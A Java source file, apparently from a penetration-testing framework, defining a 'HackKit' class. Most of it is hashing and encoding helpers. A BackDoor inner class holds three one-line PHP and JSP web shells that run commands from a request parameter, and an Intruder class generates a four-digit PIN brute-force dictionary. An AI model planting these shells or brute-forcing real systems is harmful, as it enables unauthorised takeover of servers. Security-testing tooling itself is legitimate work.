package com.trackray.base.attack;

import com.trackray.base.utils.StrUtils;
import net.dongliu.requests.Requests;
import net.dongliu.requests.Session;
import org.springframework.context.annotation.Lazy;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import java.io.ByteArrayOutputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

/**
 * 黑客工具包
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/2/12 14:44
 */
@Component
@Lazy
@Scope("prototype")
public  class HackKit {

    public EnDecrypt enDecrypt = new EnDecrypt();

    public BackDoor backDoor = new BackDoor();

    public SocialEngine socialEngine = new SocialEngine();

    public Intruder intruder = new Intruder();


    /**
     * 加密解密类
     */
    public class EnDecrypt{

        public Sha1 sha1 = new Sha1();

        public Md5 md5 = new Md5();

        public Base64 base64 = new Base64();

        public Unicode unicode = new Unicode();

        public class Sha1{
            /**
             * SHA1加密Bit数据
             *
             * @param source
             *            byte数组
             * @return 加密后的byte数组
             */
            public  byte[] SHA1Bit(byte[] source) {
                try {
                    MessageDigest sha1Digest = MessageDigest.getInstance("SHA-1");
                    sha1Digest.update(source);
                    byte targetDigest[] = sha1Digest.digest();
                    return targetDigest;
                } catch (NoSuchAlgorithmException e) {
                    throw new RuntimeException(e);
                }
            }

            /**
             * SHA1加密字符串数据
             *
             * @param source
             *            要加密的字符串
             * @return 加密后的字符串
             */
            public  String SHA1(String source) {
                return byte2HexStr(SHA1Bit(source.getBytes()));
            }

        }

        public class Md5{
            /**
             * MD5加密Bit数据
             *
             * @param source
             *            byte数组
             * @return 加密后的byte数组
             */
            public  byte[] MD5Bit(byte[] source) {
                try {
                    // 获得MD5摘要算法的 MessageDigest对象
                    MessageDigest md5Digest = MessageDigest.getInstance("MD5");
                    // 使用指定的字节更新摘要
                    md5Digest.update(source);
                    // 获得密文
                    return md5Digest.digest();
                } catch (NoSuchAlgorithmException e) {
                    throw new RuntimeException(e);
                }
            }

            /**
             * MD5加密字符串,32位长
             *
             * @param source
             *            要加密的内容
             * @return 加密后的内容
             */
            public  String MD5(String source) {
                return byte2HexStr(MD5Bit(source.getBytes()));
            }
        }

        public class Base64{
            private  final char[] base64EncodeChars = new char[] { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q',
                    'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
                    's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/' };

            private  byte[] base64DecodeChars = new byte[] { -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
                    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60,
                    61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1,
                    -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1 };

            public  String encode(byte[] data) {
                StringBuffer sb = new StringBuffer();
                int len = data.length;
                int i = 0;
                int b1, b2, b3;

                while (i < len) {
                    b1 = data[i++] & 0xff;
                    if (i == len) {
                        sb.append(base64EncodeChars[b1 >>> 2]);
                        sb.append(base64EncodeChars[(b1 & 0x3) << 4]);
                        sb.append("==");
                        break;
                    }
                    b2 = data[i++] & 0xff;
                    if (i == len) {
                        sb.append(base64EncodeChars[b1 >>> 2]);
                        sb.append(base64EncodeChars[((b1 & 0x03) << 4) | ((b2 & 0xf0) >>> 4)]);
                        sb.append(base64EncodeChars[(b2 & 0x0f) << 2]);
                        sb.append("=");
                        break;
                    }
                    b3 = data[i++] & 0xff;
                    sb.append(base64EncodeChars[b1 >>> 2]);
                    sb.append(base64EncodeChars[((b1 & 0x03) << 4) | ((b2 & 0xf0) >>> 4)]);
                    sb.append(base64EncodeChars[((b2 & 0x0f) << 2) | ((b3 & 0xc0) >>> 6)]);
                    sb.append(base64EncodeChars[b3 & 0x3f]);
                }
                return sb.toString();
            }

            /**
             * 灏哹ase64瀛楃涓茶В鐮佷负瀛楄妭鏁扮粍
             *
             * @param str
             */
            public  byte[] decode(String str) throws Exception {
                byte[] data = str.getBytes("GBK");
                int len = data.length;
                ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
                int i = 0;
                int b1, b2, b3, b4;

                while (i < len) {

            /* b1 */
                    do {
                        b1 = base64DecodeChars[data[i++]];
                    } while (i < len && b1 == -1);
                    if (b1 == -1) {
                        break;
                    }

            /* b2 */
                    do {
                        b2 = base64DecodeChars[data[i++]];
                    } while (i < len && b2 == -1);
                    if (b2 == -1) {
                        break;
                    }
                    buf.write((b1 << 2) | ((b2 & 0x30) >>> 4));

            /* b3 */
                    do {
                        b3 = data[i++];
                        if (b3 == 61) {
                            return buf.toByteArray();
                        }
                        b3 = base64DecodeChars[b3];
                    } while (i < len && b3 == -1);
                    if (b3 == -1) {
                        break;
                    }
                    buf.write(((b2 & 0x0f) << 4) | ((b3 & 0x3c) >>> 2));

            /* b4 */
                    do {
                        b4 = data[i++];
                        if (b4 == 61) {
                            return buf.toByteArray();
                        }
                        b4 = base64DecodeChars[b4];
                    } while (i < len && b4 == -1);
                    if (b4 == -1) {
                        break;
                    }
                    buf.write(((b3 & 0x03) << 6) | b4);
                }
                return buf.toByteArray();
            }
        }

        public class Url{
            /**
             * 获取url编码
             * @param obj
             * @param code 编码
             * @return
             */
            public String encode(String obj,String code) throws UnsupportedEncodingException { return java.net.URLEncoder.encode(obj,code); } /**
             * 获取url编码
             * @param obj
             * @param code 解码
             * @return
             */
            public String decode(String obj,String code) throws UnsupportedEncodingException { return java.net.URLDecoder.decode(obj,code); }
        }

        public class Unicode{

            public String encode (String str){
                return StrUtils.stringToUnicode(str);
            }

            public String decode (String str){
                return StrUtils.unicodeToString(str);
            }

        }

        /**
         * 将byte数组转换为表示16进制值的字符串. 如：byte[]{8,18}转换为：0812 和 byte[]
         * hexStr2Bytes(String strIn) 互为可逆的转换过程.
         *
         * @param bytes
         *            需要转换的byte数组
         * @return 转换后的字符串
         */
        public String byte2HexStr(byte[] bytes) {
            int bytesLen = bytes.length;
            // 每个byte用两个字符才能表示，所以字符串的长度是数组长度的两倍
            StringBuffer hexString = new StringBuffer(bytesLen * 2);
            for (int i = 0; i < bytesLen; i++) {
                // 将每个字节与0xFF进行与运算，然后转化为10进制，然后借助于Integer再转化为16进制
                String hex = Integer.toHexString(bytes[i] & 0xFF);
                if (hex.length() < 2) {
                    hexString.append(0);// 如果为1位 前面补个0
                }
                hexString.append(hex);
            }
            return hexString.toString();
        }

    }


    /**
     * 后门类
     */
    public class  BackDoor{

        public String php ="<?php eval($_REQUEST['x']);?>";
        public String php2 = "<?php assert($_REQUEST['x']);?>";
        public String jsp1 = "<%Runtime.getRuntime().exec(request.getParameter(\"x\"));%>";

    }


    /**
     * 社工类
     */
    public class  SocialEngine{
    }

    /**
     * 破解器
     */
    public  class Intruder{

        /**
         * 四位数字典生成
         * @return
         */
        public List<String> numbers4(){
            char[] chars = {'0', '1', '2', '3', '4', '5', '6','7','8','9'};
            ArrayList<String> integers = new ArrayList<>();
            per(new char[4],chars,4-1,integers);
            return integers;
        }

        protected void per(char[] buf, char[] chs, int len , ArrayList<String> strs){
            if(len == -1){
                String tmp="";
                for(int i=buf.length-1; i>=0; --i)
                    tmp+=buf[i];

                strs.add(tmp);
                return;
            }
            for(int i=0; i<chs.length; i++){
                buf[len] = chs[i];
                per(buf, chs, len-1 , strs);
            }
        }


    }

}
